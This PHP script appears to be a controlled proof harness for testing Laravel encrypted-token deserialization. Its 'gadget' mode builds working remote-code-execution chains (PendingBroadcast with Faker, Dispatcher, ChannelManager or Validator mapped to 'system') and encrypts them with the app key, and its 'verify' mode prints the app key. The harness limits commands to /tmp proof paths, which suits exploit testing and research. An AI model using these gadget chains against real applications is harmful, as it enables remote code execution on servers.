<?php
require '/var/www/vendor/autoload.php';
$app = require '/var/www/bootstrap/app.php';
$app->make(Illuminate\Contracts\Console\Kernel::class)->bootstrap();
$input = json_decode(stream_get_contents(STDIN), true, 512, JSON_THROW_ON_ERROR);
$mode = $argv[1];
function proof_path($path) {
    if (!preg_match('~\A/tmp/module-target-laraveltoken-[a-z0-9_-]+\z~', $path)) {
        throw new InvalidArgumentException('Invalid native proof path');
    }
    return $path;
}
function assign_property($object, $name, $value) {
    $property = new ReflectionProperty($object, $name);
    $property->setAccessible(true);
    $property->setValue($object, $value);
}
if ($mode === 'verify') {
    $vendor = json_decode(file_get_contents('/opt/module-target-vendor.json'), true, 512, JSON_THROW_ON_ERROR);
    $hashes = [];
    foreach ($vendor['source_sha256'] as $name => $expected) {
        $hashes[$name] = hash_file('sha256', '/var/www/' . $name);
        if (!hash_equals($expected, $hashes[$name])) {
            throw new RuntimeException('Installed source mismatch: ' . $name);
        }
    }
    $installed = json_decode(file_get_contents('/var/www/vendor/composer/installed.json'), true, 512, JSON_THROW_ON_ERROR);
    $packages = [];
    foreach (($installed['packages'] ?? $installed) as $package) {
        if (isset($vendor['packages'][$package['name']])) {
            $packages[$package['name']] = $package['version'];
        }
    }
    echo json_encode(['php' => PHP_VERSION, 'laravel' => $app->version(), 'uid' => posix_geteuid(), 'debug' => config('app.debug'), 'environment' => config('app.env'), 'cipher' => config('app.cipher'), 'key' => config('app.key'), 'packages' => $packages, 'source_sha256' => $hashes], JSON_THROW_ON_ERROR);
} elseif ($mode === 'gadget') {
    $command = base64_decode($input['command_base64'], true);
    if ($command === false || strpos($command, '/tmp/module-target-laraveltoken-') === false) {
        throw new InvalidArgumentException('Expected a controlled native proof command');
    }
    $method = $input['method'];
    if ($method === 1) {
        $events = (new ReflectionClass(Faker\Generator::class))->newInstanceWithoutConstructor();
        assign_property($events, 'formatters', ['dispatch' => 'system']);
    } elseif ($method === 2) {
        $events = (new ReflectionClass(Illuminate\Events\Dispatcher::class))->newInstanceWithoutConstructor();
        assign_property($events, 'listeners', [$command => ['system']]);
    } elseif ($method === 3) {
        $events = (new ReflectionClass(Illuminate\Notifications\ChannelManager::class))->newInstanceWithoutConstructor();
        assign_property($events, 'app', $command);
        assign_property($events, 'defaultChannel', 'x');
        assign_property($events, 'customCreators', ['x' => 'system']);
    } elseif ($method === 4) {
        $events = (new ReflectionClass(Illuminate\Validation\Validator::class))->newInstanceWithoutConstructor();
        assign_property($events, 'extensions', ['' => 'system']);
    } else {
        throw new InvalidArgumentException('Unsupported native gadget');
    }
    $broadcast = (new ReflectionClass(Illuminate\Broadcasting\PendingBroadcast::class))->newInstanceWithoutConstructor();
    assign_property($broadcast, 'events', $events);
    assign_property($broadcast, 'event', $command);
    try {
        $serialized = serialize($broadcast);
        $encrypter = !empty($input['wrong_key']) ? new Illuminate\Encryption\Encrypter(str_repeat('z', 32), 'AES-256-CBC') : $app->make('encrypter');
        $token = $encrypter->encrypt($broadcast);
    } finally {
        // Serializing/encrypting must not execute the controlled proof locally.
        assign_property($broadcast, 'events', new Illuminate\Events\Dispatcher());
        assign_property($broadcast, 'event', 'module-target-noop');
    }
    echo json_encode(['uid' => posix_geteuid(), 'method' => $method, 'serialized_base64' => base64_encode($serialized), 'serialized_sha256' => hash('sha256', $serialized), 'token' => $token], JSON_THROW_ON_ERROR);
} elseif ($mode === 'decode') {
    // Inspect actual owner bytes without deserializing or executing a gadget.
    $serialized = $app->make('encrypter')->decrypt($input['token'], false);
    echo json_encode(['base64' => base64_encode($serialized), 'bytes' => strlen($serialized)], JSON_THROW_ON_ERROR);
} elseif ($mode === 'file' || $mode === 'remove') {
    $path = proof_path($input['path']);
    if ($mode === 'remove' && file_exists($path)) {
        unlink($path);
    }
    clearstatcache(true, $path);
    echo json_encode(file_exists($path) ? ['exists' => true, 'uid' => fileowner($path), 'base64' => base64_encode(file_get_contents($path))] : ['exists' => false], JSON_THROW_ON_ERROR);
} else {
    throw new InvalidArgumentException('Unsupported native operation');
}
